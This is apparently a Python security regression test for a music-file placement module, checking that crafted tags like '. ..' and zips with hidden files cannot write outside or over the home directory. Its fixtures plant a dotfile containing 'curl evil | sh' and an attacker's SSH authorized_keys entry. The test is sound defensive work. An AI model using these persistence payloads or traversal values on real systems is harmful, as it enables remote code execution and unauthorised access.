"""Where a drop lands (place.py), against music tags and zips made to lead out of the home (symbios SECURITY.md, the
review of 24 Nov, C1: an artist tag ". .." became "..", and a dropped artist folder, hidden files included, was merged
into the home itself). A throwaway home; the tags are played, not read from real files.

    python3 bench/place_test.py
"""
import os
import sys
import tempfile
import zipfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import place  # noqa: E402

results = []


def check(name, ok):
    results.append(ok)
    print(("PASS  " if ok else "FAIL  ") + name)


check("a tag of dots and spaces in any mix is no name at all", place.safe(". ..") == "" and place.safe(" . . ") == "")
check("a tag's leading dots go, whatever spaces sit between them", place.safe(". .ssh") == "ssh")
check("slashes become dashes, the rest stays", place.safe("AC/DC") == "AC-DC" and place.safe("Bonobo") == "Bonobo")

TAG = {}
place.read_tags = lambda path: dict(TAG)  # the tags a played sound says it has


def drop(home, tree):
    """A dropped folder (or a file when tree is bytes) in a staging folder: its path."""
    stage = tempfile.mkdtemp(dir=home, prefix=".drop-")
    def make(base, t):
        for name, v in t.items():
            p = os.path.join(base, name)
            if isinstance(v, dict):
                os.makedirs(p, exist_ok=True)
                make(p, v)
            else:
                os.makedirs(os.path.dirname(p), exist_ok=True)
                open(p, "wb").write(v)
    make(stage, tree)
    return os.path.join(stage, next(iter(tree)))


def everything(root):
    return {os.path.relpath(os.path.join(d, f), root) for d, _, fs in os.walk(root) for f in fs}


with tempfile.TemporaryDirectory() as top:
    home = os.path.join(top, "home")
    os.makedirs(home)
    place.TAGS.clear()

    TAG.update(artist=". ..", album="Album")
    got = place.settle(home, drop(home, {"Artist": {"Album": {"a.mp3": b"ID3"}, ".ssh": {"authorized_keys": b"ssh-ed25519 AAAA stranger"},
                                                    ".bash_profile": b"curl evil | sh"}}))
    files = everything(top)
    check("an artist folder tagged \". ..\" lands inside the home, not merged into it",
          not os.path.exists(os.path.join(home, ".ssh")) and not os.path.exists(os.path.join(home, ".bash_profile")))
    check("and nothing at all lands above the home", all(f.startswith("home" + os.sep) for f in files))
    check("its sounds are still placed", any(f.endswith("a.mp3") for f in everything(home)))

    place.TAGS.clear()
    TAG.update(artist="..", album="..")
    got = place.settle(home, drop(home, {"b.mp3": b"ID3"}))
    check("a loose track tagged \"..\" for artist and album stays inside the home",
          all(f.startswith("home" + os.sep) for f in everything(top)) and got["path"].endswith("b.mp3") and not got["path"].startswith(".."))

    place.TAGS.clear()
    TAG.update(artist="Bonobo", album="Migration")
    got = place.settle(home, drop(home, {"c.mp3": b"ID3"}))
    check("a track with ordinary tags goes to Music/<artist>/<album> as before",
          got["path"].replace(os.sep, "/").lower().endswith("bonobo/migration/c.mp3"))

    z = os.path.join(home, ".drop-zip.zip")
    with zipfile.ZipFile(z, "w") as w:
        w.writestr("Box/notes.txt", "hello")
        w.writestr("Box/.ssh/authorized_keys", "ssh-ed25519 AAAA stranger")
        w.writestr("Box/.bashrc", "curl evil | sh")
    os.makedirs(os.path.join(home, ".stage"), exist_ok=True)
    zipped = os.path.join(home, ".stage", "Box.zip")
    os.replace(z, zipped)
    got = place.settle(home, zipped)
    landed = everything(os.path.join(home, got["path"]))
    check("a zip's hidden files are left out, and said so",
          not any(".ssh" in f or f.endswith(".bashrc") for f in landed) and len(got["left"]) == 2)
    check("its other files arrive", any(f.endswith("notes.txt") for f in landed))

    got = place.settle(home, drop(home, {".bashrc": b"curl evil | sh"}))
    check("a file dropped as .bashrc never lands hidden", not os.path.basename(got["path"]).startswith(".")
          and not os.path.exists(os.path.join(home, ".bashrc")))

print("\n%d of %d passed" % (sum(results), len(results)))
sys.exit(0 if all(results) else 1)
